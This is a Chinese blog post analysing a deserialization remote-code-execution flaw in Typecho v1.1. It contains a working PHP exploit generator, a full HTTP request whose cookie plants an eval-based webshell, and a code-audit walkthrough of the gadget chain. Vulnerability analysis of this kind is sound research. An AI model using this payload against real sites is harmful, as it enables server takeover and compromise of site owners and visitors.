---
title: Typecho v1.1 前台Getshell漏洞分析
date: 2017-11-25 23:54:16
tags:
	- 代码审计
	- 反序列化
---

Typecho v1.1-15.5.12 前台反序列化可写Shell。
这个洞出了得有一个月了，当时出的时候想要审一下，但是PHP水平不太够，没审出来，于是等了等大牛们的博客。重新梳理了下流程，在此记录一下。
<!-- more -->

## 0x00 源码下载

> https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta

## 0x01 Payload

### 1. Exp生成脚本

```
<?php 
class Typecho_Feed
{
    const RSS1 = 'RSS 1.0';
    const RSS2 = 'RSS 2.0';
    const ATOM1 = 'ATOM 1.0';
    const DATE_RFC822 = 'r';
    const DATE_W3CDTF = 'c';
    const EOL = "\n";
    private $_type;
    private $_charset;
    private $_lang;
    private $_version;
    private $_items = array();

    public function __construct($version, $type = self::RSS2, $charset = 'UTF-8', $lang = 'en')
    {
        $this->_version = $version;
        $this->_type = $type;
        $this->_charset = $charset;
        $this->_lang = $lang;
    }
	public function addItem(array $item)
    {
        $this->_items[] = $item;
    }
}
class Typecho_Request
{
	private $_params = array('screenName' => "file_put_contents('a.php', '<?php eval(\$_POST[1]);?>')");
    private $_filter = array('assert');
}
$p1 = new Typecho_Feed(1);
$p2 = new Typecho_Request();
$p1->addItem(array('author' => $p2));
$exp = array('adapter' => $p1, 'prefix' => 'MengChen');
echo base64_encode(serialize($exp));
```
### 2. http请求包
```http
GET /typecho/install.php?finish=233 HTTP/1.1
Host: 10.10.10.135
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NTp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIyOiIAVHlwZWNob19GZWVkAF9jaGFyc2V0IjtzOjU6IlVURi04IjtzOjE5OiIAVHlwZWNob19GZWVkAF9sYW5nIjtzOjI6ImVuIjtzOjIyOiIAVHlwZWNob19GZWVkAF92ZXJzaW9uIjtpOjE7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTQ6ImZpbGVfcHV0X2NvbnRlbnRzKCdhLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoiTWVuZ0NoZW4iO30=
Referer: http://10.10.10.135/typecho/install.php
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```
效果就是会在网站目录下生成一个名为`a.php`的shell，密码为1
### 3. 效果图

![](https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1.png)

## 0x02 漏洞原理分析

### 1. 正向代码审计
在`install.php`文件中，首先在第59-77行
```
if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {
    exit;
}

// 挡掉可能的跨站请求
if (!empty($_GET) || !empty($_POST)) {
    if (empty($_SERVER['HTTP_REFERER'])) {
        exit;
    }

    $parts = parse_url($_SERVER['HTTP_REFERER']);
	if (!empty($parts['port'])) {
        $parts['host'] = "{$parts['host']}:{$parts['port']}";
    }

    if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {
        exit;
    }
}
```
绕过这里需要用GET方法传入一个finish参数，然后再加入一个同源的Referer即可。

然后往下，在第229-235行，存在一个很明显的反序列化操作。
```
<?php
    $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
    Typecho_Cookie::delete('__typecho_config');
    $db = new Typecho_Db($config['adapter'], $config['prefix']);
    $db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);
    Typecho_Db::set($db);
?>
```
在这里，可以通过`cookie`把一个序列化的变量反序列化后存入变量`$config`，然后在实例化`Typecho_Db`类时作为参数传入。全局搜索`Typecho_Db`类。

文件路径为`/var/Typecho/Db.php`。

在`Db.php`文件`Typecho_Db`类的构造函数中，第120行，存在一个字符串拼接操作
```
$adapterName = 'Typecho_Db_Adapter_' . $adapterName;
```
假设`$adapterName`是一个实例化的类，那么在进行该操作时,会触发类的`__toString()`魔术方法。

然后再寻找定义了`__toString()`方法的类。

找到三个
```
/var/Typecho/Config.php
/var/Typecho/Feed.php
/var/Typecho/Query.php
```
分别跟进进行审计。

在`Feed.php`中，第290行`__toString()`方法中。
```
$content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;\
```
在这里调用了`Feed.php`中类`Typecho_Feed`的一个私有数组成员`$_items`的值，这个值我们可以控制，于是又用到了另一个魔术方法__get()。
> __get会在读取不可访问的属性的值的时候调用
无法访问的属性包括两类：不存在的属性、私有属性

因此，我们可以通过该处调用某个类的__get()魔术方法。

全局搜索下，分别跟进。

在`/var/Typecho/Requests.php`中,`Typecho_Request`类里第269-272行
```
public function __get($key)
{
    return $this->get($key);
}
在这进入了第295-311行，get()中
public function get($key, $default = NULL)
{
    switch (true) {
        case isset($this->_params[$key]):
            $value = $this->_params[$key];
            break;
        case isset(self::$_httpParams[$key]):
            $value = self::$_httpParams[$key];
            break;
        default:
            $value = $default;
            break;
    }

    $value = !is_array($value) && strlen($value) > 0 ? $value : $default;
    return $this->_applyFilter($value);
}
```
然后在第159行，进入_applyFilter()方法中
```
private function _applyFilter($value)
{
    if ($this->_filter) {
        foreach ($this->_filter as $filter) {
            $value = is_array($value) ? array_map($filter, $value) :
            call_user_func($filter, $value);
        }

        $this->_filter = array();
    }

    return $value;
}
```
在第164行，有个很醒目的`call_user_func()`函数。
`call_user_func()`是PHP的内置函数，该函数允许用户调用直接写的函数并传入一定的参数，这里就是代码执行的地方。

### 2. Payload构造逻辑

首先，我们利用`cookie`传入一个序列化后的数组，数组中有个键为`'adapter'`、值为一个实例化的`Typecho_Feed()`类的键值对。

![](https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2.png)

在实例化`Typecho_Db`类时，实例化后的`Typecho_Feed`类在`Db.php`中第120行进行了字符串拼接操作，调用了`Typecho_Feed`类的`__toString()`方法。

![](https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3.png)

于是进入了`Feed.php`第223行的`__toString()`方法中。在类`Typecho_Feed()`类中有个私有化数组成员`$_items`,
在第284行对该数组进行了遍历，然后在第290行对`$item['author']`这个实例化的`screenName`成员进行操作。
```
$content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;
```

![](https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4.png)

如果`$item['author']`这个实例化的类中没有`screenName`这个成员或者这个成员是私有的，则会调用该实例化类的`__get()`魔术方法，
并且`$item['author']`这个类我们是可以控制的，因此令它为`Typecho_Request`这个类，因为`Typecho_Request`中没有`screenName`这个成员
然后就调用的`screenName`的`__get()`魔术方法，传入了一个值为`screenName`的`$key`，进入`Request.php`第295行`Typecho_Request`类的`$_params[]`中。

![](https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5.png)

有键为`screenName`的键值对，就将它的值传入`$value`中，然后进入了`_applyFilter()`这个方法中，如果类`Typecho_Request`的成员`_filter`存在，就将其的值遍历作为函数名。
传入`call_user_func($filter, $value);`中，而`get()`方法中处理的`$value`就作为所执行函数的值传入其中`。于此代码执行

![](https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6.png)

简单的说，在这个流程中，`call_user_func()`函数的两个参数我们都可控，
于是在此构成了任意代码执行。


整个POP链就是

`Typecho_Db`类构造函数 --> `Typecho_Feed`类的`__toString()`魔术方法 --> `Typecho_Request`类的`__get()`魔术方法 --> `Typecho_Request`类的`get()`方法 --> 
`Typecho_Request`类的`_applyFilter()`方法 --> 
`call_user_func()`执行任意代码

## 0x03 PHP魔术方法

- `__construct()`，类的构造函数
- `__destruct()`，类的析构函数
- `__call()`，在对象中调用一个不可访问方法时调用
- `__callStatic()`，用静态方式中调用一个不可访问方法时调用
- `__get()`，获得一个类的成员变量时调用
- `__set()`，设置一个类的成员变量时调用
- `__isset()`，当对不可访问属性调用isset()或empty()时调用
- `__unset()`，当对不可访问属性调用unset()时被调用。
- `__sleep()`，执行serialize()时，先会调用这个函数
- `__wakeup()`，执行unserialize()时，先会调用这个函数
- `__toString()`，类被当成字符串时的回应方法
- `__invoke()`，调用函数的方式调用一个对象时的回应方法
- `__set_state()`，调用var_export()导出类时，此静态方法会被调用。
- `__clone()`，当对象复制完成时调用

## 0x04 参考

- https://paper.seebug.org/424/
- http://www.th1s.cn/index.php/2017/10/25/138.html
- https://joyqi.com/typecho/about-typecho-20171027.html?from=timeline&isappinstalled=0
- http://p0sec.net/index.php/archives/114/
